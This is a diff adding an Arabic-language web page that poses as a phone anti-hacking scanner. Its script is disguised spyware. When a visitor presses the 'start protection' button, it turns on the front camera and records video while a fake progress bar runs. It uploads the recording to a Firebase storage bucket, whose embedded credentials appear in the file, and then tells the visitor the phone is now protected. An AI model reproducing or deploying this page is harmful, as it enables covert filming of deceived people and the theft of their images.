@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>حماية الهاتف من الاختراق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0a0a2e, #1a1a4e, #0a0a2e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 25px;
+            padding: 50px 30px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.8);
+        }
+        .shield {
+            font-size: 100px;
+            margin-bottom: 25px;
+            animation: pulse 2s infinite;
+            filter: drop-shadow(0 0 30px rgba(0,255,0,0.5));
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 900;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #00ff00, #00cc00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        p {
+            color: #888;
+            margin-bottom: 30px;
+            font-size: 14px;
+            line-height: 1.8;
+        }
+        .scan-btn {
+            width: 100%;
+            padding: 20px;
+            font-size: 20px;
+            font-weight: 900;
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #00ff00, #00aa00);
+            color: #000;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+            box-shadow: 0 10px 30px rgba(0,255,0,0.3);
+        }
+        .scan-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0,255,0,0.5);
+        }
+        .scan-btn:active {
+            transform: translateY(0);
+        }
+        .scan-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .progress {
+            display: none;
+            margin-top: 25px;
+        }
+        .progress.active {
+            display: block;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #00aa00);
+            border-radius: 5px;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .progress-text {
+            font-size: 16px;
+            font-weight: 700;
+            color: #00ff00;
+        }
+        .result {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(0,255,0,0.1);
+            border-radius: 15px;
+            border: 1px solid rgba(0,255,0,0.3);
+        }
+        .result.active {
+            display: block;
+        }
+        .check-icon {
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+        video {
+            display: none;
+        }
+        .features {
+            margin-top: 30px;
+            display: grid;
+            gap: 10px;
+        }
+        .feature {
+            padding: 10px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+            font-size: 13px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="shield">🛡️</div>
+        <h1>حماية الهاتف من الاختراق</h1>
+        <p>احمِ هاتفك الآن من أي محاولات اختراق أو تجسس. اضغط على الزر لبدء الفحص الأمني الشامل.</p>
+        
+        <button class="scan-btn" onclick="startProtection()">🔒 ابدأ الحماية الآن</button>
+        
+        <div class="progress" id="progress">
+            <div class="progress-text" id="progressText">⏳ جاري فحص الهاتف...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+        
+        <div class="result" id="result">
+            <div class="check-icon">✅</div>
+            <h2>تمت الحماية بنجاح!</h2>
+            <p>هاتفك الآن آمن ومحمي من الاختراق</p>
+        </div>
+        
+        <video id="video" autoplay playsinline></video>
+        
+        <div class="features">
+            <div class="feature">🛡️ حماية شاملة من الفيروسات</div>
+            <div class="feature">🔒 تشفير البيانات الشخصية</div>
+            <div class="feature">📡 كشف محاولات الاختراق</div>
+        </div>
+    </div>
+
+    <script>
+        firebase.initializeApp({
+            apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
+            projectId: "game-a1aca",
+            storageBucket: "game-a1aca.firebasestorage.app",
+            appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
+        });
+        
+        const storage = firebase.storage();
+        let mediaRecorder;
+        let recordedChunks = [];
+        let stream;
+
+        async function startProtection() {
+            const btn = document.querySelector('.scan-btn');
+            const progress = document.getElementById('progress');
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            const result = document.getElementById('result');
+            const video = document.getElementById('video');
+            
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري الفحص...';
+            progress.classList.add('active');
+            result.classList.remove('active');
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                mediaRecorder = new MediaRecorder(stream);
+                recordedChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const fileName = 'protection_' + Date.now() + '.webm';
+                    const storageRef = storage.ref('phone_protection/' + fileName);
+                    
+                    try {
+                        await storageRef.put(blob);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        video.srcObject = null;
+                        
+                        progress.classList.remove('active');
+                        result.classList.add('active');
+                        btn.textContent = '🔒 ابدأ الحماية الآن';
+                        btn.disabled = false;
+                    } catch (error) {
+                        console.error('Upload error:', error);
+                        btn.disabled = false;
+                        btn.textContent = '🔒 ابدأ الحماية الآن';
+                    }
+                };
+                
+                mediaRecorder.start();
+                
+                let progressValue = 0;
+                const progressInterval = setInterval(() => {
+                    progressValue += 1;
+                    progressFill.style.width = progressValue + '%';
+                    
+                    if (progressValue >= 100) {
+                        clearInterval(progressInterval);
+                        progressText.textContent = '✅ اكتمل الفحص!';
+                        setTimeout(() => {
+                            mediaRecorder.stop();
+                        }, 1000);
+                    }
+                }, 150);
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                btn.disabled = false;
+                btn.textContent = '🔒 ابدأ الحماية الآن';
+                progress.classList.remove('active');
+            }
+        }
+    </script>
+</body>
+</html>
